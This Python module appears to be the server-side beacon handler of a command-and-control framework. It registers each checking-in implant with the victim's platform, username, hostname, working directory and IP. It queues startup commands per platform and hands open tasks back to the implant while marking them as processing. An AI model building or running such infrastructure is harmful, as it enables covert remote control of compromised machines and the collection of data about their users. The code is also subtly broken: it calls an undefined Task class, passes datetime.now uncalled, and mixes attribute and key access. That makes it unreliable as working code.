
from app.models import StartupTasks, Tasks
from app.operations import History, Beacon
import datetime
import json

class Pulse:
    def __init__(self, beacon_id):
        self.beacon_id = beacon_id

    def process(self, post_data, remote_ip, channel='http'):
        beacon_exists = Beacon(self.beacon_id).get()
        if beacon_exists['result'] == "failed":
            create_beacon = Beacon(self.beacon_id).create(post_data.platform,
                post_data.username, post_data.timer, post_data.hostname, 
                post_data.data, post_data.working_dir, remote_ip)

            startup_tasks = StartupTasks.objects(platform=post_data['platform'])
            for tasks in startup_tasks:
                create_tasks = Task.create(post_data['beacon_id'], tasks.commands, datetime.datetime.now)


        store_history = History(self.beacon_id).create(post_data.platform, post_data.username,
            post_data.hostname, post_data.data, post_data.working_dir, remote_ip)
        get_tasks = Tasks.objects(beacon_id=post_data['beacon_id'], task_status="Open").only('id', 'commands')
        result = json.loads(get_tasks.to_json())
        get_tasks.update(task_status="Processing")
        return result